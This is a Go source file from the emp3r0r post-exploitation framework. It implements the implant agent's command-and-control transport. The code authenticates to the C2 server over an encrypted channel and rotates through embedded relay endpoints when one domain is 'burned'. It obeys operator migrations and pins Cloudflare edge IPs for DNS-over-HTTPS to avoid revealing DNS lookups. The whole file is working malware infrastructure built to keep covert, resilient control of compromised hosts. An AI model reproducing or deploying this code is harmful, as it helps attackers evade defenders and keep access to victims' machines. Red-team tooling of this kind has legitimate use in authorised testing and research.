package c2transport

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/ncruces/go-dns"
)

// EstablishC2Connection connects to C2 using the configured wrapper mode.
// All auth is carried in MsgAuth CBOR over SecureConn, independent of wrapper.
//
// The returned stream is always a *transport.SecureConn. Its first frame is the
// MsgAuth envelope, encrypted with the static per-build PSK (def.AESPassword)
// so the server can authenticate and route it. Once that envelope is sent, any
// auxiliary route (FTP/WWW/proxy) stream is immediately re-keyed to the
// ephemeral PFS session key negotiated on the message tunnel — all subsequent
// frames of the session use the PFS key, never the static PSK.
func EstablishC2Connection(url, streamID string, capabilities ...string) (conn io.ReadWriteCloser, ctx context.Context, cancel context.CancelFunc, err error) {
	ctx, cancel = context.WithCancel(context.Background())
	mode := common.RuntimeConfig.C2ChannelMode
	if mode == "" {
		mode = def.C2ChannelModeDefault
	}
	channelWrapper, resolveErr := transport.GetC2ChannelWrapper(mode)
	if resolveErr != nil {
		available := strings.Join(transport.AllC2ChannelModes(), ",")
		cancel()
		return nil, nil, nil, fmt.Errorf("unsupported c2 channel mode %q (available: %s)", mode, available)
	}
	if mode == def.C2ChannelModePlainHTTP {
		if w, ok := channelWrapper.(*transport.HTTPChannelWrapper); ok {
			w.Config = &common.RuntimeConfig.MalleableC2
			w.PollInterval = common.RuntimeConfig.PollInterval
			w.Jitter = common.RuntimeConfig.Jitter
		}
	}

	// Failover: try each relay endpoint at most once. On the first call
	// the caller-provided URL is used; after a dial failure the address is
	// rotated to the next embedded endpoint and the dial is retried. The
	// loop terminates after trying all endpoints or on a non-network error.
	tried := make(map[string]bool)
	var rw io.ReadWriteCloser
	for {
		logging.Infof("EstablishC2Connection: connecting to %s with mode=%s", url, mode)

		var dialErr error
		rw, dialErr = establishChannelStream(ctx, url, channelWrapper)
		if dialErr != nil {
			tried[url] = true
			// Operator hot-migration: the relay closed us with 4002 + the new
			// endpoint. It outranks the embedded endpoint list (which may
			// predate the migration) — dial the announced endpoint directly.
			if mig := transport.RelayMigration(); mig != "" && mig != url && !tried[mig] {
				logging.Warningf("relay migrated by operator, switching from %s to %s",
					maskURLSecret(url), maskURLSecret(mig))
				rotateDoH(url, mig)
				def.CCAddress = mig
				url = mig
				continue
			}
			nextRelayEndpoint(url)
			nextURL := def.CCAddress
			if nextURL == url || tried[nextURL] {
				// all relay endpoints exhausted
				cancel()
				return nil, nil, nil, dialErr
			}
			logging.Warningf("relay %s unreachable, trying %s", maskURLSecret(url), maskURLSecret(nextURL))
			url = nextURL
			continue
		}
		break // dial succeeded
	}

	caps, capErr := normalizeMsgAuthCapabilities(capabilities)
	if capErr != nil {
		err = fmt.Errorf("normalize MsgAuth capabilities: %w", capErr)
		_ = rw.Close()
		cancel()
		return nil, nil, nil, err
	}

	secureConn := transport.NewSecureConn(rw)
	if sendErr := sendMsgAuthEnvelope(secureConn, caps, streamID); sendErr != nil {
		err = fmt.Errorf("send MsgAuth: %w", sendErr)
		_ = rw.Close()
		cancel()
		return nil, nil, nil, err
	}

	// The MsgAuth envelope above was encrypted with the per-build PSK. From
	// here on, auxiliary streams of an established session switch to the
	// ephemeral PFS session key. Check-in and the message tunnel are bootstrap
	// routes: they run BEFORE (and negotiate) the PFS handshake, so they must
	// stay on the PSK until the tunnel handshake completes inside MsgTunneler.
	if !isBootstrapRoute(caps) {
		// Acquire a reference so a concurrent message-tunnel teardown (which
		// clears the current key for reconnect/check-in) cannot yank the key
		// out mid-setup: the relay must use the SAME key the C2 re-keys this
		// stream with, or the first data frame fails to decrypt.
		if sessionKey := acquireSessionKey(); len(sessionKey) > 0 {
			secureConn.SetKey(sessionKey)
			logging.Debugf("EstablishC2Connection: re-keyed %v stream to ephemeral PFS session key", caps)
			releaseSessionKey()
		}
	}

	return secureConn, ctx, cancel, nil
}

// relayMu serializes endpoint rotation across concurrent failing streams.
var relayMu sync.Mutex

// nextRelayEndpoint rotates def.CCAddress to the next relay endpoint after a
// dial failure. Agents embed the full relay URL list (role=agent) at build
// time; trying them in order gives a live fleet an escape path when one relay
// domain gets burned — the next reconnect attempt automatically targets the
// next endpoint, no operator intervention required.
//
// Direct (non-relay) C2 addresses and single-endpoint configs never rotate.
// All endpoints reach the SAME CC (it dials out to every relay it listens on),
// so endpoint identity is transport-level only: sessions, keys and routing are
// unaffected by which relay a stream rides.
func nextRelayEndpoint(failedURL string) {
	relayMu.Lock()
	defer relayMu.Unlock()

	urls := common.RuntimeConfig.RelayURLs
	if len(urls) < 2 || !strings.Contains(failedURL, "role=agent") {
		return
	}
	idx := -1
	for i, u := range urls {
		if u == failedURL {
			idx = i
			break
		}
	}
	if idx < 0 {
		return
	}
	next := urls[(idx+1)%len(urls)]
	def.CCAddress = next
	common.RuntimeConfig.CCAddress = next
	logging.Warningf("relay endpoint unreachable, failing over: %s -> %s", maskURLSecret(failedURL), maskURLSecret(next))

	// DoH often shares the relay's fate: genagent pins it to the first
	// endpoint's host (/dns route of the same Worker domain). If the burned
	// domain is also our DNS server, re-home DoH onto the next endpoint,
	// otherwise we could not even RESOLVE the failover target.
	rotateDoH(failedURL, next)
}

// rotateDoH re-homes the DoH server onto the failover target's /dns route
// when the old DoH host matches the failed endpoint's host.
func rotateDoH(failedURL, nextURL string) {
	if common.RuntimeConfig.DoHServer == "" {
		return
	}
	failedHost := hostOf(failedURL)
	if failedHost == "" || !strings.Contains(common.RuntimeConfig.DoHServer, failedHost) {
		return
	}
	newDoH := deriveDoH(nextURL)
	if newDoH == "" {
		return
	}
	if resolver, err := NewPinnedDoHResolver(newDoH); err == nil && resolver != nil {
		net.DefaultResolver = resolver
		common.RuntimeConfig.DoHServer = newDoH
		logging.Warningf("DoH re-homed to failover endpoint: %s", hostOf(nextURL))
	}
}

// deriveDoH builds the /dns route URL for a relay endpoint's host.
func deriveDoH(endpointURL string) string {
	host := hostOf(endpointURL)
	secret := queryParam(endpointURL, "secret")
	if host == "" || secret == "" {
		return ""
	}
	return fmt.Sprintf("https://%s/dns?secret=%s", host, secret)
}

// cfEdgeBootstrapIPs are generic Cloudflare anycast edge addresses that
// terminate TLS for ANY proxied hostname via SNI routing (a zone's own
// 104.21.x/172.67.x pair is just a slice of the same anycast network;
// verified working 2026-09). Pinning them lets a DoH resolver bootstrap
// WITHOUT resolving the DoH server's own hostname through the plaintext
// system resolver — the last DNS leak an agent had.
var cfEdgeBootstrapIPs = []string{
	"104.16.249.36:443",
	"172.67.68.100:443",
	"188.114.96.3:443",
	"188.114.97.3:443",
}

// NewPinnedDoHResolver returns a DoH resolver for uri (https://host/dns?...)
// that never consults the system resolver: the DoH transport dials pinned CF
// anycast edges directly, with TLS SNI still selecting our zone. Falls back
// to the stock resolver (plaintext system-DNS bootstrap) when no pinned
// edge answers — e.g. if CF retires those addresses.
func NewPinnedDoHResolver(uri string) (*net.Resolver, error) {
	pinned, err := dns.NewDoHResolver(uri, dns.DoHCache(), dns.DoHAddresses(cfEdgeBootstrapIPs...))
	if err == nil {
		ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
		defer cancel()
		// verify the pinned path actually works by resolving the relay host
		// itself (pre-warms the cache for the first WS dial, too)
		if host := hostOf(uri); host != "" {
			if _, lerr := pinned.LookupHost(ctx, host); lerr == nil {
				return pinned, nil
			}
		}
	}
	return dns.NewDoHResolver(uri, dns.DoHCache())
}

func hostOf(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	return u.Hostname()
}

func queryParam(rawURL, key string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	return u.Query().Get(key)
}

// maskURLSecret hides the secret query parameter in logs (agent-side copy).
func maskURLSecret(u string) string {
	for i := 0; i+8 <= len(u); i++ {
		if u[i:i+8] == "&secret=" {
			return u[:i+8] + "***"
		}
	}
	return u
}

// isBootstrapRoute reports whether the given MsgAuth capabilities target the
// check-in or message-tunnel route. Those two routes run the pre-handshake
// protocol and are always encrypted with the static per-build PSK.
func isBootstrapRoute(caps []string) bool {
	routes := &common.RuntimeConfig.C2Routes
	for _, c := range caps {
		if c == routes.Checkin || c == routes.Msg {
			return true
		}
	}
	return false
}

func establishChannelStream(ctx context.Context, url string, channelWrapper transport.C2ChannelWrapper) (io.ReadWriteCloser, error) {
	// Relay endpoints (worker_ws) dial their own WebSocket and need no HTTP client;
	// other channels require def.HTTPClient for their transport.
	isRelay := strings.HasPrefix(url, "ws://") || strings.HasPrefix(url, "wss://")
	if !isRelay && def.HTTPClient == nil {
		return nil, fmt.Errorf("http client is not initialized")
	}

	type connectResult struct {
		stream io.ReadWriteCloser
		resp   *http.Response
		err    error
	}
	resultChan := make(chan connectResult, 1)
	go func() {
		stream, r, e := channelWrapper.Dial(ctx, def.HTTPClient, url)
		resultChan <- connectResult{stream: stream, resp: r, err: e}
	}()

	select {
	case res := <-resultChan:
		if res.err != nil {
			return nil, fmt.Errorf("initiate channel stream: %w", res.err)
		}
		if res.resp != nil && res.resp.StatusCode != http.StatusOK {
			_ = res.stream.Close()
			return nil, fmt.Errorf("bad status code: %d", res.resp.StatusCode)
		}
		return res.stream, nil
	case <-time.After(10 * time.Second):
		return nil, fmt.Errorf("establish channel stream timeout")
	}
}

func normalizeMsgAuthCapabilities(capabilities []string) ([]string, error) {
	seen := make(map[string]struct{}, len(capabilities)+1)
	normalized := make([]string, 0, len(capabilities)+1)
	for _, cap := range capabilities {
		if cap == "" {
			continue
		}
		if _, ok := seen[cap]; ok {
			continue
		}
		seen[cap] = struct{}{}
		normalized = append(normalized, cap)
	}
	if len(normalized) == 0 {
		return nil, fmt.Errorf("at least one explicit MsgAuth capability is required")
	}
	return normalized, nil
}
